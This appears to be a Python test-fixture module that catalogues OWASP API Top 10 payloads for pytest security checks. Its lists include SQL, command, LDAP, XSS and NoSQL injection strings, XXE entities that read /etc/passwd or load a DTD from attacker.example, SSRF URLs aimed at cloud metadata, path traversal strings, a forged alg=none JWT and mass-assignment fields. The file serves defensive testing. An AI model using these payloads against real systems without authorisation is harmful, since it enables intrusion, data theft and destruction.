@@ -1,0 +1,335 @@
+# owasp-payloads.py — OWASP API Top 10 payload catalogue (A9.5, v0.48.0).
+#
+# Curated adversarial payloads for API security testing, mapped to the
+# OWASP API Security Top 10 (2023). Pulled from the ai-testing-agent's
+# security_scan integration + community-standard OWASP corpus. Used by
+# the S3 security pytest templates as their attack input constants:
+# import this module and iterate the relevant payload list against your
+# endpoint, then assert 4xx (rejected) NOT 5xx (unhandled).
+#
+# THE CONTRACT: every payload is a STRING that must not crash your app.
+# 4xx-family responses are acceptable and expected (validation caught
+# the input). 5xx (server error / stack trace / timeout) means the
+# input reached deeper than it should have — that's the finding.
+#
+# Adopter usage:
+#   from tests.owasp_payloads import (
+#       INJECTION_PAYLOADS,
+#       BROKEN_AUTH_PAYLOADS,
+#       BOLA_PAYLOADS,
+#       MASS_ASSIGNMENT_PAYLOADS,
+#       INJECTION_SQL_PAYLOADS,
+#       INJECTION_NOSQL_PAYLOADS,
+#       INJECTION_LDAP_PAYLOADS,
+#       INJECTION_XSS_PAYLOADS,
+#       INJECTION_CMD_PAYLOADS,
+#       XXE_PAYLOADS,
+#       SSRF_PAYLOADS,
+#       PATH_TRAVERSAL_PAYLOADS,
+#       DESERIALIZATION_PAYLOADS,
+#   )
+#
+#   @pytest.mark.parametrize("payload", INJECTION_SQL_PAYLOADS)
+#   def test_user_endpoint_rejects_sql_injection(payload, client):
+#       resp = client.post("/api/users", json={"email": payload})
+#       assert resp.status_code < 500, f"5xx on SQL payload: {payload!r}"
+#
+# Delete lists that don't apply to your stack (LDAP-free apps don't
+# need INJECTION_LDAP_PAYLOADS). Don't silent-pass a category — either
+# test it or explicitly document why it's irrelevant.
+
+
+# ─── OWASP API1:2023 — Broken Object Level Authorization (BOLA) ───────
+# Cross-tenant / cross-user object references. Every one should return
+# 403 or 404, NEVER 200 (which would mean you leaked another tenant's
+# data).
+BOLA_PAYLOADS = [
+    "1",
+    "0",
+    "-1",
+    "99999999",
+    "../1",
+    "../../1",
+    "1' OR '1'='1",
+    "1 OR 1=1",
+    "1;DROP TABLE users;--",
+    # UUID with tenant prefix flipped — apps that switch on the first
+    # 8 chars leak data across tenants.
+    "00000000-0000-0000-0000-000000000001",
+    "ffffffff-ffff-ffff-ffff-ffffffffffff",
+]
+
+
+# ─── OWASP API2:2023 — Broken Authentication ─────────────────────────
+# Session-token / JWT / auth-header manipulations. Every one should
+# reject the session, not accept it with reduced privilege.
+BROKEN_AUTH_PAYLOADS = [
+    # Empty / whitespace tokens
+    "",
+    " ",
+    "\t",
+    "\n",
+    # Common developer-forgot-to-remove test values
+    "test",
+    "admin",
+    "null",
+    "undefined",
+    "Bearer null",
+    "Bearer undefined",
+    # JWT alg=none — the classic
+    "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxIiwiYWRtaW4iOnRydWV9.",
+    # JWT with kid=../../../etc/passwd style path traversal
+    "eyJhbGciOiJIUzI1NiIsImtpZCI6Ii4uLy4uLy4uL2V0Yy9wYXNzd2QifQ.e30.",
+    # Base64-decoded "admin:admin"
+    "Basic YWRtaW46YWRtaW4=",
+    # Session ID with SQL injection
+    "sess_1' OR '1'='1",
+    # Extremely long token — DoS surface
+    "A" * 100_000,
+]
+
+
+# ─── OWASP API3:2023 — Broken Object Property Level Auth (BOPLA) ─────
+# Mass assignment attempts. POST a payload with extra fields the
+# endpoint doesn't officially accept; the app should IGNORE the extra
+# fields, not store them.
+MASS_ASSIGNMENT_PAYLOADS = [
+    {"is_admin": True},
+    {"is_staff": True},
+    {"role": "admin"},
+    {"role": "superuser"},
+    {"user_id": 1},
+    {"tenant_id": 1},
+    {"organization_id": 1},
+    {"balance": 999999.99},
+    {"credit": 999999.99},
+    {"quota_bytes": 99999999999},
+    {"is_verified": True},
+    {"is_active": True},
+    {"deleted_at": None},  # attempt to un-delete
+    {"created_at": "2000-01-01T00:00:00Z"},  # backdate
+]
+
+
+# ─── OWASP API4:2023 — Unrestricted Resource Consumption ─────────────
+# Payloads that pass validation but consume disproportionate resources.
+RESOURCE_EXHAUSTION_PAYLOADS = [
+    # Deeply nested JSON (parser stack overflow)
+    "{" * 1000 + "}" * 1000,
+    # Extremely wide JSON (memory pressure)
+    "[" + ",".join(["0"] * 100_000) + "]",
+    # Regex-catastrophic-backtracking bait
+    "a" * 10_000 + "!",
+    # ZIP bomb bait (a filename that would decompress to GB)
+    "..%2f" * 10_000,
+    # Extremely long single field
+    "A" * 1_000_000,
+    # Base64 blob that decodes to a large image (bait for image
+    # processing endpoints)
+    "iVBORw0KGgo" + "A" * 1_000_000 + "==",
+]
+
+
+# ─── OWASP API5:2023 — Broken Function Level Authorization ───────────
+# Admin-only endpoint access from a non-admin session. These are HTTP
+# method / path variants, not string payloads — enumerate them as
+# tuples the test iterates.
+BFLA_METHOD_PAYLOADS = [
+    ("DELETE", "/api/users/1"),
+    ("PATCH", "/api/users/1/role"),
+    ("POST", "/api/admin/backfill"),
+    ("PUT", "/api/settings/global"),
+    ("DELETE", "/api/tenants/1"),
+    # HTTP verb tunneling — headers that override the method
+    ("POST", "/api/users/1", {"X-HTTP-Method-Override": "DELETE"}),
+    ("POST", "/api/users/1", {"X-HTTP-Method": "DELETE"}),
+]
+
+
+# ─── OWASP API8:2023 — Security Misconfiguration (headers) ───────────
+# Requests with header combinations that mask origin or trick the app.
+MISCONFIG_HEADER_PAYLOADS = [
+    {"X-Forwarded-For": "127.0.0.1"},           # trust-boundary bypass
+    {"X-Real-IP": "127.0.0.1"},
+    {"X-Originating-IP": "127.0.0.1"},
+    {"X-Forwarded-Host": "attacker.example"},
+    {"Host": "attacker.example"},
+    {"X-Forwarded-Proto": "https"},              # mixed-context confusion
+    {"CF-Connecting-IP": "127.0.0.1"},
+    {"Referer": "javascript:alert(1)"},
+]
+
+
+# ─── SQL injection ───────────────────────────────────────────────────
+INJECTION_SQL_PAYLOADS = [
+    "'",
+    "\"",
+    "' OR '1'='1",
+    "' OR 1=1--",
+    "\" OR \"\"=\"",
+    "') OR ('1'='1",
+    "1; DROP TABLE users;--",
+    "1' UNION SELECT NULL,NULL,NULL--",
+    "1' AND (SELECT COUNT(*) FROM information_schema.tables)>0--",
+    "'; EXEC xp_cmdshell('dir');--",
+    "1' AND SLEEP(5)--",
+    "1' AND pg_sleep(5)--",
+    "1' AND BENCHMARK(5000000,MD5('a'))--",
+    # Second-order — the payload itself is harmless but is stored and
+    # later used unsafely.
+    "admin'--",
+    "admin' /*",
+    "0x27; -- ",
+]
+
+
+# ─── NoSQL injection ─────────────────────────────────────────────────
+INJECTION_NOSQL_PAYLOADS = [
+    {"$gt": ""},
+    {"$ne": None},
+    {"$regex": ".*"},
+    {"$where": "1==1"},
+    {"$or": [{"a": 1}, {"a": 2}]},
+    # JSON body payloads that Mongo interprets as operators
+    {"username": {"$ne": None}, "password": {"$ne": None}},
+    {"email": {"$regex": "^admin"}},
+]
+
+
+# ─── LDAP injection ──────────────────────────────────────────────────
+INJECTION_LDAP_PAYLOADS = [
+    "*",
+    "*)(&",
+    "*))(|(uid=*",
+    "admin)(&",
+    "admin)(|(uid=*",
+    "*)(objectClass=*",
+    "*))%00",
+]
+
+
+# ─── XSS payloads ────────────────────────────────────────────────────
+INJECTION_XSS_PAYLOADS = [
+    "<script>alert(1)</script>",
+    "<img src=x onerror=alert(1)>",
+    "javascript:alert(1)",
+    "\"><script>alert(1)</script>",
+    "<svg onload=alert(1)>",
+    "<iframe srcdoc='<script>alert(1)</script>'>",
+    "<body onload=alert(1)>",
+    # Encoded / obfuscated
+    "&lt;script&gt;alert(1)&lt;/script&gt;",
+    "%3Cscript%3Ealert(1)%3C%2Fscript%3E",
+    "<sCrIpT>alert(1)</sCrIpT>",
+    # DOM XSS via URL fragment
+    "#<script>alert(1)</script>",
+    # Template injection — Jinja / Handlebars
+    "{{7*7}}",
+    "${7*7}",
+    "<%=7*7%>",
+]
+
+
+# ─── Command injection ───────────────────────────────────────────────
+INJECTION_CMD_PAYLOADS = [
+    "; ls",
+    "| ls",
+    "&& ls",
+    "|| ls",
+    "`ls`",
+    "$(ls)",
+    "; cat /etc/passwd",
+    "| cat /etc/passwd",
+    "; sleep 5",
+    # Windows equivalents
+    "& dir",
+    "| dir",
+    "&& dir",
+    # Null-byte truncation (older interpreters)
+    "input\x00; ls",
+]
+
+
+# ─── XXE ──────────────────────────────────────────────────────────────
+XXE_PAYLOADS = [
+    # Classic file read
+    """<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>""",
+    # SSRF via XXE
+    """<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><foo>&xxe;</foo>""",
+    # Blind XXE with external DTD
+    """<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.example/evil.dtd">%xxe;]><foo/>""",
+    # Billion laughs (DoS)
+    """<?xml version="1.0"?><!DOCTYPE lolz [<!ENTITY lol "lol"><!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">]><lolz>&lol2;</lolz>""",
+]
+
+
+# ─── SSRF payloads (URL inputs) ──────────────────────────────────────
+SSRF_PAYLOADS = [
+    # Cloud metadata endpoints — the classic prod SSRF target
+    "http://169.254.169.254/latest/meta-data/",
+    "http://metadata.google.internal/computeMetadata/v1/",
+    "http://169.254.169.254/metadata/instance",  # Azure
+    # Localhost variants
+    "http://127.0.0.1/",
+    "http://localhost/",
+    "http://[::1]/",
+    "http://0.0.0.0/",
+    # Bypass filters that only block "localhost" / "127.0.0.1"
+    "http://127.1/",
+    "http://127.0.1/",
+    "http://2130706433/",  # decimal representation of 127.0.0.1
+    "http://0x7f.0x0.0x0.0x1/",  # hex
+    # Redirect chains — filter blocks step 1, follows to step 2
+    "http://attacker.example/redirect?to=http://127.0.0.1/",
+    # File / gopher schemes (some HTTP libs follow these)
+    "file:///etc/passwd",
+    "gopher://127.0.0.1:6379/",
+    "dict://127.0.0.1:11211/",
+]
+
+
+# ─── Path traversal ──────────────────────────────────────────────────
+PATH_TRAVERSAL_PAYLOADS = [
+    "../etc/passwd",
+    "../../etc/passwd",
+    "../../../etc/passwd",
+    "../../../../../../etc/passwd",
+    "..\\..\\..\\..\\windows\\system32\\config\\sam",
+    # URL-encoded
+    "%2e%2e%2fetc%2fpasswd",
+    "%2e%2e/etc/passwd",
+    # Double URL-encoded
+    "%252e%252e%252fetc%252fpasswd",
+    # UTF-8 encoding tricks
+    "..%c0%afetc%c0%afpasswd",
+    # Null byte truncation (older stacks)
+    "../etc/passwd%00.jpg",
+    # Absolute paths (some validators only reject relative)
+    "/etc/passwd",
+    "C:\\windows\\system32\\config\\sam",
+]
+
+
+# ─── Insecure deserialization ────────────────────────────────────────
+DESERIALIZATION_PAYLOADS = [
+    # Python pickle — anything except plain data should fail
+    b"\x80\x04\x95\x00\x00\x00\x00\x00\x00\x00\x00}\x94.",  # empty dict (baseline)
+    # Java (base64-encoded serialized object with a payload) — placeholder;
+    # apps should reject all serialized-object input from untrusted sources
+    "rO0ABXNyABJqYXZhLnV0aWwuSGFzaE1hcAAAAAAAAAABAgACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAB3CAAAABAAAAAAeA==",
+    # PHP serialized-object — old attack surface still relevant
+    "O:8:\"stdClass\":1:{s:1:\"a\";s:1:\"b\";}",
+]
+
+
+# ─── Aggregated INJECTION_PAYLOADS — everything category-agnostic ────
+# Convenience alias for "throw the whole book at this input and see if
+# anything crashes." Prefer the category-specific lists above when you
+# know the endpoint's shape.
+INJECTION_PAYLOADS = (
+    INJECTION_SQL_PAYLOADS
+    + INJECTION_XSS_PAYLOADS
+    + INJECTION_CMD_PAYLOADS
+    + INJECTION_LDAP_PAYLOADS
+    + PATH_TRAVERSAL_PAYLOADS
+)
